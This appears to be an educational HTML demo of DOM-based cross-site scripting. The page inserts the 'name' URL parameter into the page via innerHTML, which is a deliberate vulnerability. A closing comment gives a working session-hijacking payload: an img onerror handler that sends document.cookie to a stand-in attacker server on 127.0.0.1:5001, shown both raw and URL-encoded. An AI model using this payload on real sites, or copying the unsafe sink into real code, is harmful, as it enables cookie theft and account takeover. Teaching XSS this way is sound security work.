<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Example</title>
</head>
<body>

    <!-- Vulnerable Code -->
     <div>
        Welcome, <span id="username"></span>!
     </div>



    <script>

        //function to set a cookie,  (mostly this will be set by the server)
        function setCookie(name, value, days) {
           const date = new Date();
           date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
           const expires = "expires=" + date.toUTCString();
           document.cookie = name + "=" + value + ";" + expires + ";path=/";
           
           
            // const expires = new Date(Date.now() + days * 24 * 60 * 60 * 1000);
            // document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/`;
        }

        //Example: Set a cookie named "exampleCookie" with a value of "Hello, Cookie" that expires in 7 days
        setCookie("exampleCookie", "Hello, Cookie", 7);

    </script>

    <script>
        const params = new URLSearchParams(window.location.search);
        const name = params.get('name');
        document.getElementById('username').innerHTML = `${name}`;
    </script>
</body>
</html>




<!-- 
-- User Session Hijacking :

attacker-param-script: (there is a query-param called "name", inside that what i'm passing is img-tag (we can pass js-code / script-tag), with a source called "does-not-exist" , if on-error execute this code-of-script i.e reading document.cookie and pass that cookie to the url of the img-tag (i.e the img.src is an random-endpoint that i want to send some request containing the info related to cookie)) 
    ?name=<img src=\"does-not-exist\" onerror=\"var img = document.createElement(\'img\'); img.src = `https://127.0.0.1:5001/cookie?data=${document.cookie}`; document.querySelector(\'body\').appendChild(img);\">

    instead of img-tag (src can be anything like http://127.0.0.1:5001/cookie(i.e attacker-server is running on 127.0.0.1:5001)), pass this encodedURIComponent

    encodedURIComponent:   
        "%3Fname%3D%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20img%20%3D%20document.createElement('img')%3B%20img.src%20%3D%20%60https%3A%2F%2F127.0.0.1%3A5001%2Fcookie%3Fdata%3D%24%7Bdocument.cookie%7D%60%3B%20document.querySelector('body').appendChild(img)%3B%22%3E"
-->